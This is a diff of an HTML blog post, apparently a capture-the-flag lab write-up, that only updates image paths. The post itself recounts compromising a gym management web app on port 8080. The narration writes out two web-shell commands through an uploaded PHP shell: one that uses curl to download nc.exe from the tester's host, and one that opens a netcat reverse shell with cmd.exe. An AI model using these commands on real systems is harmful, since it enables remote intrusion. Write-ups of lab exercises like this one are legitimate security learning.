@@ -44,20 +44,20 @@ On the other hand, firewalls usually do not limit outgoing connections at all. T
             
         </div>
         <header class="hero">
-            <img src="NmapScan.png" alt="" class="hero-img">
+            <img src="blogimages/NmapScan.png" alt="" class="hero-img">
         </header>
         <p> Nmap Scan didn't give any good results but it showed 8080 is open for web server and that was where the main enumeration comes into the picture. After opening port 8080 with IP it showed a proper gym management system and after getting more deep into it, in about panel, there was clearly mentioned "Made Using Gym Management Software" after googling vulnerabilities of gym management system</p>
         <header class="hero">
-            <img src="GoogleSearch.png" style="max-width: 500px;" alt="" class="hero-img">
+            <img src="blogimages/GoogleSearch.png" style="max-width: 500px;" alt="" class="hero-img">
         </header>
         <p>I downloaded and executed this software but it didn't worked for me. But after reading source code and finding out what urls this script is trying to fetch, to access it manually I found it is allowing to check its uploads and a bit of directory traversial "upload/kamehameha.php" after this I created 
         a python simpleHTTPsever on my machine to upload netcat to get reverse shell using <strong>http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl%20-O%2010.10.14.145/nc.exe</strong></p>
         <header class="hero">
-            <img src="CreatingServer.png" style="max-width: 700px;" alt="" class="hero-img">
+            <img src="blogimages/CreatingServer.png" style="max-width: 700px;" alt="" class="hero-img">
         </header>
             <p>After uploading nc on machine it was easy to connect and extablish a shell as link was allowing to execute commands <strong>10.10.10.198:8080/upload/kamehameha.php?telepathy=nc -e cmd.exe 10.10.14.145 4444</strong></p>
             <header class="hero">
-                <img src="reverseshell.png" style="max-width: 700px;" alt="" class="hero-img">
+                <img src="blogimages/reverseshell.png" style="max-width: 700px;" alt="" class="hero-img">
             </header>
             <p>After so much of Scanning Enumeration it gave back this RCE it was my first RCE on a server.</p>       
     </section>
